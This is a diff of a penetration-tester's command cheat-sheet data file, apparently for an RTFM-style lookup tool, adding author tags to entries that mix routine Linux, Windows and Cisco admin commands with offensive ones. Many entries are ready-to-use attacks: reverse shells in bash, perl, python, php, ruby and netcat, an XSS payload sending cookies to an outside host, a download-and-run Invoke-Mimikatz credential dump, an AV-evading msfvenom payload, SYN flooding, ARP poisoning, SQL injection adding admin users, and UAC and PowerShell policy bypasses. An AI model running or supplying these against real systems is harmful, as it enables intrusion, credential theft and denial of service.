@@ -1,5 +1,7 @@
 rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
 Helpception, search for a command with two tags and a comment
+Innes
+Innes
 EOC
 linux
 EOT
@@ -8,6 +10,7 @@ https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
 EOR
 awk /^[TERM]/ '{print "See the",$1,"at the",$3}' words.txt
 Use only the lines that match a given RegEX [TERM]
+?
 EOC
 linux
 bash
@@ -18,6 +21,7 @@ https://www.cyberciti.biz/faq/bash-scripting-using-awk/
 EOR
 awk '{print "Avg for",$1,"is",($2+$3+$4)/3}' grades.txt
 Calculations using AWK. AWK is a huge language, not just for printing columns
+?
 EOC
 linux
 bash
@@ -28,6 +32,7 @@ https://www.cyberciti.biz/faq/bash-scripting-using-awk/
 EOR
 awk 'NR==1;END{print}' file.txt
 Print first and last lines of a file
+?
 EOC
 linux
 bash
@@ -38,6 +43,7 @@ https://www.cyberciti.biz/faq/bash-scripting-using-awk/
 EOR
 awk -F ";" '{print $2}' file.txt
 Split the file on ; instead of space
+?
 EOC
 Linux
 bash
@@ -48,6 +54,7 @@ https://www.cyberciti.biz/faq/bash-scripting-using-awk/
 EOR
 awk '/start_pattern/,/stop_pattern/' file.txt
 Print a portion of the text
+?
 EOC
 Linux
 bash
@@ -58,6 +65,7 @@ https://www.cyberciti.biz/faq/bash-scripting-using-awk/
 EOR
 show system mode
 show mode of as500
+?
 EOC
 cisco
 EOT
@@ -65,6 +73,7 @@ http://www.cisco.com/c/en/us/td/docs/server_nw_virtual/2-5_release/command_refer
 EOR
 interface GigabitEthernet7; switchport trunk allowed vlan add 2
 add vlan to your interface
+?
 EOC
 cisco
 networking
@@ -73,6 +82,7 @@ http://www.cisco.com/c/en/us/td/docs/switches/datacenter/nexus5000/sw/configurat
 EOR
 cvs diff <file>
 diff file in cvs
+?
 EOC
 bash
 linux
@@ -81,6 +91,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 cvs log <file>
 show history of files
+?
 EOC
 linux
 bash
@@ -89,6 +100,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 file=cvs.txt; cvs update -r $(cvs log $file | grep ^revision | sed -n 2p | awk '{print $NF}') $file && mv $file{,.old} && cvs update -A $file && mv $file.old $file && cvs commit -m "Reverted to previous version" $file
 roll back cvs change
+?
 EOC
 linux
 bash
@@ -98,6 +110,7 @@ http://tulrich.com/geekstuff/cvs.html
 EOR
 find -L . -type l
 find broken symlinks
+?
 EOC
 linux
 bash
@@ -106,6 +119,7 @@ https://www.cyberciti.biz/faq/linux-unix-find-files-with-symbolic-links/
 EOR
 chkconfig --list
 List services started on boot
+?
 EOC
 linux
 EOT
@@ -113,6 +127,7 @@ https://access.redhat.com/documentation/en-US/Red_Hat_Enterprise_Linux/6/html/De
 EOR
 screen -D -R [ID]
 Hijack screen
+?
 EOC
 linux
 bash
@@ -121,6 +136,7 @@ https://www.cyberciti.biz/tips/linux-screen-command-howto.html
 EOR
 ssh -R [lport]:[rip]:[rport] [ip] -N
 Forward the remote port to the local machine
+Innes
 EOC
 linux
 bash
@@ -132,6 +148,7 @@ https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to
 EOR
 ssh -L [lport]:[rip]:[rport] [ip] -N
 Forward the local port to the remote machine
+Innes
 EOC
 linux
 bash
@@ -143,6 +160,7 @@ https://www.cyberciti.biz/faq/set-up-ssh-tunneling-on-a-linux-unix-bsd-server-to
 EOR
 dd if=/dev/zero of=1g.img count=1M bs=1K
 1Gig of zeros
+Innes
 EOC
 linux
 files
@@ -152,6 +170,7 @@ https://www.cyberciti.biz/faq/linux-unix-dd-command-show-progress-while-coping/
 EOR
 chage -l root
 get password policy for root
+Innes
 EOC
 linux
 bash
@@ -163,6 +182,7 @@ http://www.thegeekstuff.com/2009/04/chage-linux-password-expiration-and-aging/
 EOR
 while sleep 1;do tput sc;tput cup 0 $(($(tput cols)-29));date;tput rc;done &
 Display system clock in terminal top right corner! :-)
+?
 EOC
 linux
 loop
@@ -173,6 +193,7 @@ http://www.computerhope.com/unix/utput.htm
 EOR
 smartctl -d megaraid,0 -x /dev/sda
 display disk info
+?
 EOC
 linux
 EOT
@@ -180,6 +201,7 @@ https://www.cyberciti.biz/tips/linux-find-out-if-harddisk-failing.html
 EOR
 hping3 -1 [ip]
 icmp ping
+Innes
 EOC
 linux
 bash
@@ -189,6 +211,7 @@ http://wiki.hping.org/
 EOR
 hping3 -8 [port]-[port] -S [ip] -V
 syn scan port range with hping
+Innes
 EOC
 Linux
 bash
@@ -199,6 +222,7 @@ http://wiki.hping.org/
 EOR
 hping3 -A [ip] -p [port]
 ACK scan on port
+Innes
 EOC
 Linux
 bash
@@ -209,6 +233,7 @@ http://wiki.hping.org/
 EOR
 hping3 -2 [ip] -p [port ]
 udp port scan
+Innes
 EOC
 Linux
 bash
@@ -219,6 +244,7 @@ https://www.cyberciti.biz/tips/howto-linux-iptables-bypass-firewall-restriction.
 EOR
 hping3 -Q [ip] -p [port] -s
 Get initial sequence number
+Innes
 EOC
 linux
 bash
@@ -228,6 +254,7 @@ http://wiki.hping.org/
 EOR
 hping3 -S [ip] -p [port] --tcp-timestamp
 get remote timestamp
+Innes
 EOC
 Linux
 bash
@@ -238,6 +265,7 @@ http://wiki.hping.org/
 EOR
 hping3 -F -p -U [ip] -p [port]
 Xmas' scan
+Innes
 EOC
 Linux
 bash
@@ -248,6 +276,7 @@ http://wiki.hping.org/
 EOR
 hping3 -1 [ip].x --rand-dest -I em1
 Sweep range for up hosts ie 192.168.1.x
+Innes
 EOC
 Linux
 bash
@@ -257,6 +286,7 @@ http://wiki.hping.org/
 EOR
 hping3 -9 HTTP -I em1
 Intercept all http
+Innes
 EOC
 Linux
 bash
@@ -266,6 +296,7 @@ http://wiki.hping.org/
 EOR
 hping3 -S [victim] -a [gw] -p [port] --flood
 Syn flood victim
+Innes
 EOC
 Linux
 bash
@@ -276,6 +307,7 @@ http://wiki.hping.org/
 EOR
 display interface brief
 hp switch show if info
+Innes
 EOC
 networking
 hp
@@ -284,14 +316,16 @@ http://www.h3c.com.hk/technical_support___documents/technical_documents/wlan/acc
 EOR
 GET //google.com
 get google
+Innes
 EOC
 Linux
 bash
 EOT
 https://www.lifewire.com/get-linux-command-4093526
 EOR
-hydra -L ~/pentest/lists/users-common.txt -P ~/pentest/lists/500-worst-passwords.txt -t 1 -e ns -f -vV <destination> http-get /
+hydra -L [usernames] -P [passwords] -t 1 -e ns -f -vV <destination> http-get /
 Brute HTTP with hydra -s 443 for ssl
+Innes
 EOC
 Linux
 brute
@@ -301,6 +335,7 @@ https://www.aldeid.com/wiki/Thc-hydra#Usage
 EOR
 if [ $carprice -gt 20000]; then echo "too much"; else echo "ok"; fi
 bash if
+Innes
 EOC
 Linux
 bash
@@ -310,6 +345,7 @@ https://bash.cyberciti.biz/guide/If..else..fi
 EOR
 <script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); i.send();</script>
 Grab the cookie
+Innes
 EOC
 web application
 XSS
@@ -320,6 +356,7 @@ https://excess-xss.com/
 EOR
 meterpreter> execute -f cmd.exe -i -H
 executes a command on the remote machine (i.e. opens up a command shell)
+Innes
 EOC
 metasploit
 EOT
@@ -327,6 +364,7 @@ https://www.offensive-security.com/metasploit-unleashed/meterpreter-basics/
 EOR
 nmap -sS -P0 -T4 -n -iL info/ips.txt -oA nmap/quick-scan
 Quick scan to set us off
+@yght
 EOC
 networking
 scanning
@@ -335,6 +373,7 @@ https://wiki.archlinux.org/index.php/Nmap
 EOR
 nmap -sS -P0 -T4 -Pn -n -iL info/ips.txt -oA nmap/quick-scan
 Quick scan of all the hosts (ignore pinging)
+@yght
 EOC
 networking
 scanning
@@ -343,6 +382,7 @@ https://wiki.archlinux.org/index.php/Nmap
 EOR
 nmap -sS -P0 -T4 -p0-65535 -n -g 80 -iL info/ips.txt -oA nmap/source-port
 Source port spoofing
+@yght
 EOC
 networking
 scanning
@@ -351,6 +391,7 @@ https://wiki.archlinux.org/index.php/Nmap
 EOR
 nmap -sS -sU -T4 -Pn -p0-65535 -n -iL info/ips.txt -oA nmap/all-ports
 All port scan : assume up
+@yght
 EOC
 networking
 scanning
@@ -359,6 +400,7 @@ https://wiki.archlinux.org/index.php/Nmap
 EOR
 nmap -sS -P0 -T4 -n -A -iL info/ips.txt -oA nmap/os-discovery
 OS Detection
+@yght
 EOC
 networking
 scanning
@@ -367,6 +409,7 @@ https://wiki.archlinux.org/index.php/Nmap
 EOR
 nmap -sS -P0 -T5 -n -p 1433 -iL info/ips.txt -oA nmap/internal-sqls
 Find sql servers
+@yght
 EOC
 networking
 scanning
@@ -375,6 +418,7 @@ https://wiki.archlinux.org/index.php/Nmap
 EOR
 openssl x509 -noout -modulus -in [CERT] | openssl md5
 # Verify the certificate / private key association
+Innes
 EOC
 Linux
 bash
@@ -384,6 +428,7 @@ https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
 openssl x509 -in certificate.crt -text
 https://www.sslshopper.com/article-most-common-openssl-commands.html
+Innes
 EOC
 Linux
 bash
@@ -393,6 +438,7 @@ https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
 echo "" | openssl s_client -connect [ip]:443 2>/dev/null| grep ^subject | sed 's/^.*CN=//'
 Grab the hostname in the certificate
+@yght
 EOC
 Linux
 bash
@@ -402,6 +448,7 @@ https://www.sslshopper.com/article-most-common-openssl-commands.html
 EOR
 ifconfig eth0 hw ether 00:E0:81:5C:B4:0F
 Change MAC address
+Innes
 EOC
 Linux
 bash
@@ -412,6 +459,7 @@ https://www.cyberciti.biz/faq/linux-change-ip-address/
 EOR
 ip route show to match [IP]
 How will the sytem route traffic to [IP]
+Innes
 EOC
 Linux
 bash
@@ -420,7 +468,8 @@ EOT
 http://baturin.org/docs/iproute2/
 EOR
 route -n
-Depricated way of showing routing table, please see the IP command
+Depricated way of showing routing table, please see the ip command
+Innes
 EOC
 Linux
 bash
@@ -430,6 +479,7 @@ http://baturin.org/docs/iproute2/
 EOR
 skipfish -O -MEU -o results-nonauth -W ~/pentest/wordlists/skipfish.wl -k 00:30:00 https://[ip]
 Skipfish scanner
+Innes
 EOC
 web application
 scanning
@@ -438,6 +488,7 @@ https://github.com/spinkham/skipfish
 EOR
 curl -D - --proxy1.0 [ip]:80 -m 2 [url]
 Curl through a proxy (-m = timeout)
+Innes
 EOC
 Linux
 bash
@@ -447,6 +498,7 @@ http://www.thegeekstuff.com/2012/04/curl-examples/
 EOR
 curl -k --cookie "[cookie]" [url] --silent | grep "<title>"
 Curl with cookie
+Innes
 EOC
 Linux
 bash
@@ -456,6 +508,7 @@ http://www.thegeekstuff.com/2012/04/curl-examples/
 EOR
 smbclient -I [IP] -L [domain] -N -U ""
 Null session smb
+Innes
 EOC
 Linux
 smb
@@ -466,6 +519,7 @@ https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
 EOR
 snmpwalk -v 1 -c public [TARGET]
 Default community string in SNMP
+Innes
 EOC
 Linux
 bash
@@ -476,6 +530,7 @@ http://net-snmp.sourceforge.net/docs/man/snmpwalk.html
 EOR
 ettercap -M arp -T -i em1 -L log /[TARGET]//
 Ettercap arp poisoning
+Innes
 EOC
 Linux
 networking
@@ -485,6 +540,7 @@ https://ettercap.github.io/ettercap/
 EOR
 fierce -threads 10 -dns [domain] -wordlist [wordlist] -dnsserver 8.8.8.8 -file fierce.txt
 Fierce (v0.9) - DNS bruteforcer
+Innes
 EOC
 Linux
 networking
@@ -496,6 +552,7 @@ ha.ckers.org/fierce/
 EOR
 lsof 2>/dev/null | grep deleted;  cat /proc/24702/fd/4
 recover file after being deleted
+?
 EOC
 Linux
 bash
@@ -505,6 +562,7 @@ https://www.cyberciti.biz/tips/linux-ext3-ext4-deleted-files-recovery-howto.html
 EOR
 rpm -qa | less
 list installed programs
+Innes
 EOC
 Linux
 bash
@@ -514,6 +572,7 @@ https://www.linux.com/blog/rpm-commands
 EOR
 echo "hello fredrick" | sed 's/.\{4\}$//'
 remove 4 chars
+Innes
 EOC
 Linux
 bash
@@ -525,6 +584,7 @@ https://www.cyberciti.biz/faq/tag/sed-command/
 EOR
 cat db.schema | sed G
 add space after each line
+Innes
 EOC
 Linux
 bash
@@ -536,6 +596,7 @@ https://www.cyberciti.biz/faq/tag/sed-command/
 EOR
 sed 's/ *$//;s/$/;/' linkedin.txt | paste - - - - | tr -d '\t'
 convert a list into a multi line CSV
+Innes
 EOC
 Linux
 bash
@@ -547,6 +608,7 @@ https://www.cyberciti.biz/faq/tag/sed-command/
 EOR
 sed -i '/^[0-9]/ s/^/sshd: /' /etc/hosts.allow
 # Add to the beginning of the line starting with a pattern
+Innes
 EOC
 Linux
 bash
@@ -558,6 +620,7 @@ https://www.cyberciti.biz/faq/tag/sed-command/
 EOR
 bash -i >& /dev/tcp/10.0.0.1/8080 0>&1
 bash reverse shell
+Innes
 EOC
 Linux
 bash
@@ -567,6 +630,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 perl -e 'use Socket;$i="10.0.0.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl reverse shell
+Innes
 EOC
 Linux
 Windows
@@ -577,6 +641,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 python reverse shell
+Innes
 EOC
 Linux
 Windows
@@ -587,6 +652,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 php reverse shell : php from the CLI
+Innes
 EOC
 Linux
 Windows
@@ -597,6 +663,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
 ruby reverse shell
+Innes
 EOC
 Linux
 Windows
@@ -607,6 +674,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 nc -e /bin/sh 10.0.0.1 1234
 net cat reverse shell
+Innes
 EOC
 Linux
 Windows
@@ -616,6 +684,7 @@ https://highon.coffee/blog/reverse-shell-cheat-sheet/
 EOR
 null union all select load_file('/etc/passwd')/*
 Load a file with MYSQL
+Innes
 EOC
 web application
 sql injection
@@ -625,6 +694,7 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-she
 EOR
 exec sp_configure 'xp_cmdshell', 1 go reconfigure
 enable xp_cmdshell
+Innes
 EOC
 web application
 sql injection
@@ -635,6 +705,7 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-she
 EOR
 create user victor identified by pass123 temporary tablespace temp default tablespace users;grant connect to victor;grant resource to victor;
 oracle add user
+Innes
 EOC
 web application
 sql injection
@@ -644,6 +715,7 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sh
 EOR
 insert into mysql.user (user, host, password) values ('victor', 'localhost', password('pass123'))
 mysql add user
+Innes
 EOC
 web application
 sql injection
@@ -653,6 +725,7 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-she
 EOR
 exec sp_addlogin 'victor', 'pass123';  exec sp_addsrvrolemember 'victor', 'sysadmin'
 mssql add user
+Innes
 EOC
 web application
 sql injection
@@ -662,6 +735,7 @@ http://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-she
 EOR
 # rm -rf `which nano`; ln -s `which vim` /usr/bin/nano
 Fix nano <3 ;)
+Innes
 EOC
 Files
 bash
@@ -672,6 +746,7 @@ https://xkcd.com/378/
 EOR
 net start
 list windows services
+Innes
 EOC
 Windows
 enumeration
@@ -680,6 +755,7 @@ https://technet.microsoft.com/en-us/library/bb490949.aspx
 EOR
 net accounts
 list windows password requirements : add /domain for AD
+Innes
 EOC
 Windows
 enumeration
@@ -688,6 +764,7 @@ https://technet.microsoft.com/en-us/library/bb490949.aspx
 EOR
 net accounts /domain
 password requirements domain
+Innes
 EOC
 enumeration
 windows
@@ -697,6 +774,7 @@ https://technet.microsoft.com/en-us/library/bb490949.aspx
 EOR
 reaver -i mon0 -c <channel> -b <bssid> -vv
 try to reave WPS wifi
+Innes
 EOC
 brute
 wireless
@@ -706,6 +784,7 @@ http://tools.kali.org/wireless-attacks/reaver
 EOR
 <%div style="xss:expression(alert(123))">
 .net xss filter evasion
+Innes
 EOC
 web application
 XSS
@@ -714,6 +793,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 EOR
 <IMG SRC=j&#X41vascript:alert('test2')>
 .net xss filter evasion
+Innes
 EOC
 XSS
 web application
@@ -722,6 +802,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 EOR
 %2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi
 UTF7 xss
+Innes
 EOC
 web application
 XSS
@@ -730,6 +811,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 EOR
 sl
 not ls
+Innes
 EOC
 Linux
 bash
@@ -739,6 +821,7 @@ https://www.cyberciti.biz/tips/displays-animations-when-accidentally-you-type-sl
 EOR
 command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter
 Abuse open x11 : Think open term add user add key ;)
+Innes
 EOC
 Linux
 bash
@@ -749,6 +832,7 @@ https://ubuntuforums.org/archive/index.php/t-1970619.html
 EOR
 echo 1 > /sys/module/usbcore/parameters/old_scheme_first
 WIFI enable USB2 before USB3 : helps with passthrough
+Innes
 EOC
 Linux
 wireless
@@ -759,6 +843,7 @@ http://forums.fedoraforum.org/archive/index.php/t-30868.html
 EOR
 airodump-ng -f 4000  --cswitch 1 --band abg  wlan0mon --output-format csv -w WifiOverview
 WIFI : Scan the range in an orderly manner
+@yght
 EOC
 enumeration
 wireless
@@ -768,6 +853,7 @@ https://www.aircrack-ng.org/doku.php?id=airodump-ng
 EOR
 ifconfig wlan0 down; iwconfig wlan0 mode monitor; ifconfig wlan0 up;
 WIFI : Enable monitor mode on interface
+Innes
 EOC
 Linux
 networking
@@ -778,6 +864,7 @@ https://www.aircrack-ng.org/doku.php?id=airodump-ng
 EOR
 yaps.exe -start -start_address [victim] -stop_address [victim] -start_port [port] -stop_port [port] -timeout 5 -resolve n
 Yaps windows portscan, upload first duh
+Innes
 EOC
 Windows
 networking
@@ -787,6 +874,7 @@ http://www.steelbytes.com/?mid=19
 EOR
 cat json.txt | sed "s/false/§false§/g" | sed "s/true/§true§/g" | sed "s/null/§null§/g" | sed "s/:\"/:\"§/g" | sed "s/\",/§\",/g" | sed "s/\"}/§\"}/g" | sed "s/\\[\\]/\\[§§\\]/g"
 Burpify JSON request
+@yght
 EOC
 bash
 interesting
@@ -797,6 +885,7 @@ https://www.yg.ht/
 EOR
 <script src=//[ip]>
 mini xss
+@yght
 EOC
 web application
 XSS
@@ -805,6 +894,7 @@ https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet
 EOR
 ./msfvenom -p windows/meterpreter/reverse_https -f dll -e x86/shikata_ga_nai -i 30 LHOST=[IP] LPORT=443 > /data/Clients/[FILE]
 MSF Venom make dll
+@yght
 EOC
 metasploit
 av evasion
@@ -813,6 +903,7 @@ https://www.offensive-security.com/metasploit-unleashed/msfvenom/
 EOR
 runas /user:[DOM]\[USER] [EXE]
 Windows run as
+Innes
 EOC
 Windows
 EOT
@@ -820,6 +911,7 @@ https://technet.microsoft.com/en-gb/library/bb490994.aspx
 EOR
 accesschk.exe -uwcqv "Authenticated Users" *
 Priv esc check weak service perms, you may need an older version for older windows!
+Innes
 EOC
 Windows
 enumeration
@@ -828,6 +920,7 @@ https://technet.microsoft.com/en-us/sysinternals/accesschk.aspx
 EOR
 Set-ExecutionPolicy unrestricted
 powershell bypass block
+Innes
 EOC
 Windows
 powershell
@@ -836,6 +929,7 @@ https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
 EOR
 powershell.exe -noprofile -executionpolicy bypass
 powershell bypass block
+Innes
 EOC
 Windows
 powershell
@@ -844,10 +938,12 @@ https://blog.netspi.com/15-ways-to-bypass-the-powershell-execution-policy/
 EOR
 for host in $(cat ../nmap/[IP File]); do echo "Trying $host"; smbclient -L $host -U  [DOM]/[USER]%'[PASS]'; done
 loop to find user shares
+Innes
 EOC
 loop
 smb
 bash
+linux
 enumeration
 EOT
 https://yg.ht
@@ -855,6 +951,7 @@ https://www.samba.org/samba/docs/man/manpages-3/smbclient.1.html
 EOR
 powershell "IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/1qMn59d'); Invoke-Mimikatz -DumpCreds"
 Invoke mimicatz, can use with psexec for pwnage
+@yght
 EOC
 Windows
 passwords
@@ -866,6 +963,7 @@ https://github.com/clymb3r/PowerShell/tree/master/Invoke-Mimikatz
 EOR
 procdump.exe -accepteula -ma keepass.exe keepass.dmp
 Dump a processes memory for offline abuse
+Innes
 EOC
 Windows
 memory
@@ -874,6 +972,7 @@ https://sourceforge.net/p/keepass/feature-requests/1907/
 EOR
 setenforce permissive
 kill puppies, you monster (disable SElinux, though seriously just work around it)
+Innes
 EOC
 Linux
 EOT
@@ -881,6 +980,7 @@ https://stopdisablingselinux.com/
 EOR
 for host in $(cat userhosts.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host 'WMIC ComputerSystem Get UserName'; done | tee loggedin-dirty.txt;cat loggedin-dirty.txt | grep -v "^\[" | grep -v "^Impacket" | grep -v "^Trying" | grep -v "SMB SessionError" | sed '/^$/d'
 loop for who is where
+@yght
 EOC
 loop
 smb
@@ -893,6 +993,7 @@ https://yg.ht
 EOR
 Get-ADUser -filter * -properties * | sort-object passwordlastset | select-object samaccountname, passwordlastset, passwordneverexpires, homedirectory, mail, enabled | Export-csv -path c:\temp\pwprofile.csv
 Powershell password last changed, run on DC
+@yght
 EOC
 Windows
 enumeration
@@ -904,6 +1005,7 @@ https://www.reddit.com/r/sysadmin/comments/3y0pad/some_ad_checks_you_should_be_r
 EOR
 dnscmd 127.0.0.1 /ZoneExport [FQDN] [OUT].zone
 dump dns zone on DC
+Innes
 EOC
 Windows
 dns
@@ -912,8 +1014,9 @@ EOT
 https://yg.ht
 https://technet.microsoft.com/en-us/library/cc772069(v=ws.11).aspx
 EOR
-mount -t cifs \\\\[victim]\\SYSVOL$ -o username=[user],password=[password] mount/; nautilus mount/;
+mount -t cifs \\\\[victim]\\SYSVOL -o username=[user],password=[password] mount/; nautilus mount/;
 Mount Sysvol share (hosted on the DC)
+Innes
 EOC
 Linux
 Files
@@ -924,6 +1027,7 @@ https://www.cyberciti.biz/faq/linux-mount-cifs-windows-share/
 EOR
 egrep -r "cpassword|net" mount
 Look in 'mount' for share (mount sysvol first)
+Innes
 EOC
 Linux
 smb
@@ -933,6 +1037,7 @@ https://blogs.technet.microsoft.com/ash/2014/11/10/dont-set-or-save-passwords-us
 EOR
 for host in $(cat ../nmap/IPs-SMB.txt); do echo $host; psexec.py [DOMAIN]/[user]:'[pass]'@$host "ipconfig"; done | grep "IPv4 Address\|Ethernet adapter\|^[0-9]" | sed '/^$/d' | tee dualhomed-search.txt
 loop to look for dual homed hosts
+@yght
 EOC
 loop
 networking
@@ -944,6 +1049,7 @@ https://technet.microsoft.com/en-gb/library/bb490921.aspx
 EOR
 for i in `cat smb_up `; do timeout 10 psexec.py [user]:[pass]@$i net localgroup administrators; done | tee local_admin_information
 loop to find local admins
+@yght
 EOC
 Linux
 loop
@@ -955,6 +1061,7 @@ https://technet.microsoft.com/en-us/library/bb490706.aspx
 EOR
 egrep -v "(\*\] T|\[\*\] F|[\*\] C|[\*\] U|[\*\] S|[\*\] R)" local_admin_information | egrep -v "(\[\*\] P|\[\*\] R|\[\*\] S|\[\*\] O|\[\*\] U)" | grep -v "Alias name" | grep -v "Administrators have complete" | grep -v \[\!\] | grep -v \[-\] | dos2unix | grep -v "^$" | sed s/"\[\*\] Creating service.*on"/''/g | grep -v Members | sed s/\\.\\.\\.\\.\\./','/g | sed s/"^ "/"€"/g | sed s/'The command completed successfully.'/€/g | tr "\n" "," | tr € "\n" | grep -v "^$" | sort | uniq  > local_admins.csv
 turn loop for local admins into csv
+@yght
 EOC
 linux
 loop
@@ -967,6 +1074,7 @@ http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO.html
 EOR
 tsql -S [IP] -U sa -P"[PASS]"
 connect to mssql
+Innes
 EOC
 Linux
 mssql
@@ -975,6 +1083,7 @@ https://linux.die.net/man/1/tsql
 EOR
 /opt/impacket/examples/mssqlclient.py [user]:[pass]@[ip] -port [port]
 connect to mssql
+Innes
 EOC
 Linux
 mssql
@@ -984,6 +1093,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 c:\windows\system32\inetsrv\appcmd.exe list apppool "SharePoint Central Administration v4" /text:ProcessModel.Password
 Recover IIS password
+@yght
 EOC
 Windows
 passwords
@@ -995,6 +1105,7 @@ https://www.iis.net/learn/get-started/getting-started-with-iis/getting-started-w
 EOR
 netdom query trust
 get domain trusts
+@yght
 EOC
 Windows
 enumeration
@@ -1004,6 +1115,7 @@ https://technet.microsoft.com/en-us/library/cc772217(v=ws.11).aspx
 EOR
 netsh interface portproxy show all
 show native port forwards windows
+@yght
 EOC
 Windows
 networking
@@ -1014,6 +1126,7 @@ https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
 EOR
 netsh interface portproxy add v4tov4 protocol=tcp listenport=[lport] connectport=[rport] listenaddress=[lip] connectaddress=[rip]
 set native port forward windows
+@yght
 EOC
 Windows
 networking
@@ -1025,6 +1138,7 @@ https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
 EOR
 netsh interface portproxy reset
 reset native port forward windows
+@yght
 EOC
 Windows
 networking
@@ -1036,6 +1150,7 @@ https://technet.microsoft.com/en-us/library/cc731068(v=ws.10).aspx
 EOR
 sc query "MpsSvc"
 windows firewall status
+@yght
 EOC
 Windows
 enumeration
@@ -1046,6 +1161,7 @@ https://technet.microsoft.com/en-us/library/dd228922(v=ws.11).aspx
 EOR
 netsh advfirewall firewall
 windows firewall status
+@yght
 EOC
 Windows
 enumeration
@@ -1055,6 +1171,7 @@ https://technet.microsoft.com/en-us/library/bb490939.aspx
 EOR
 tasklist /v
 Windows process list
+Innes
 EOC
 Windows
 enumeration
@@ -1065,6 +1182,7 @@ https://technet.microsoft.com/en-gb/library/bb491010.aspx
 EOR
 taskkill /f /im [PROCESS]
 Windows force kill process
+Innes
 EOC
 Windows
 process management
@@ -1073,6 +1191,7 @@ https://technet.microsoft.com/en-gb/library/bb491010.aspx
 EOR
 netstat -a | find "LISTENING"
 Windows list listening ports
+Innes
 EOC
 Windows
 networking
@@ -1082,6 +1201,7 @@ http://Microsoft.com
 EOR
 tasklist /FI "IMAGENAME eq [process].exe" /V
 Windows open files
+Innes
 EOC
 Windows
 Files
@@ -1091,6 +1211,7 @@ https://technet.microsoft.com/en-gb/library/bb491010.aspx
 EOR
 bypassuac.exe /c [COMMAND]
 ByPassUAC
+Innes
 EOC
 Windows
 EOT
@@ -1098,6 +1219,7 @@ https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/wind
 EOR
 at [TIME] command.exe /s cmd SYSCMD
 Scheduled cmd to run
+@yght
 EOC
 Linux
 Windows
@@ -1108,6 +1230,7 @@ https://www.lifewire.com/linux-command-at-4091646
 EOR
 for host in $(cat hosts.txt); do psexec.py [DOM]/[USER]:'[PASS]'@$host "cmd.exe"; done
 loop around and open cmd, Psexecy.py != psexec msf != sysinternals psexec
+@yght
 EOC
 Linux
 loop
@@ -1119,6 +1242,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 psexec.py -hashes [LM]:[NTLM] [DOM]/[USER]@[TARGET] "cmd.exe"
 PSExec with hashses
+Innes
 EOC
 Linux
 remote command shell
@@ -1129,6 +1253,7 @@ https://www.coresecurity.com/corelabs-research/open-source-tools/impacket
 EOR
 rpcclient -U '[DOMAIN]\[USER]'%'[PASS]' '[TARGET]' -c enumdomusers,enumdomgroups
 RPCClient smb show users and groups
+Innes
 EOC
 linux
 smb
@@ -1139,6 +1264,7 @@ https://www.samba.org/samba/docs/man/manpages/rpcclient.1.html
 EOR
 name=sslfile;openssl genrsa -out $name.key 2048;openssl req -new -key $name.key -out $name.csr; openssl x509 -req -days 10 -in $name.csr -signkey $name.key -out $name.crt;openssl pkcs12 -export -clcerts -in $name.crt -inkey $name.key -out $name.p12;openssl pkcs12 -in $name.p12 -out $name.pem -clcerts
 Create Self-signed cert / key
+@yght
 EOC
 Linux
 bash
@@ -1149,6 +1275,7 @@ https://www.sslshopper.com/article-how-to-create-a-self-signed-certificate.html
 EOR
 wmic service get name,displayname,pathname,startmode
 Unquoted Service Paths
+@yght
 EOC
